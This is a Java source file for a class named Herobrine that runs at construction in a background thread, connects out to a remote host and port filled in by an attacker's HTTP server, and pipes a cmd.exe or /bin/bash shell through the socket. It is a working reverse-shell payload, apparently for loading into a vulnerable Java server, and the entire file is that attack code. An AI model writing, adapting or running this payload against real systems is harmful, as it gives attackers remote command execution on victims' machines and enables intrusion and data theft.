import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Herobrine extends Thread
{
    // values are stamped by the HTTP server
    private static String remoteHost = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    private static int remotePort = Integer.parseInt("BBBBBBBB");

    public Herobrine()
    {
        // !! constructor blocks the main server thread; don't dawdle
        super();
        this.start();
    }
    
    public void run()
    {
        try
        {
            // connect to the listener
            Socket s = new Socket(remoteHost, remotePort);

            // start the shell (cross-platform!)
            String cmd = System.getProperty("os.name").contains("Win") ? "cmd.exe" : "/bin/bash";
            Process p = new ProcessBuilder(cmd)
                .redirectErrorStream(true)
                .start();

            // redirect I/O through the socket
            InputStream pi = p.getInputStream(),
                pe = p.getErrorStream(),
                si = s.getInputStream();
            OutputStream po = p.getOutputStream(),
                so = s.getOutputStream();

            while(!s.isClosed())
            {
                // pump I/O
                while(pi.available() > 0)
                    so.write(pi.read());
                while(pe.available() > 0)
                    so.write(pe.read());
                while(si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();

                Thread.sleep(50);
                try
                {
                    p.exitValue();  // throws if the process has not exited
                    break;
                }
                catch (Exception e) {}
            }
            // cleanup
            p.destroy();
            s.close();
        }
        catch (Exception e) {}
    }
}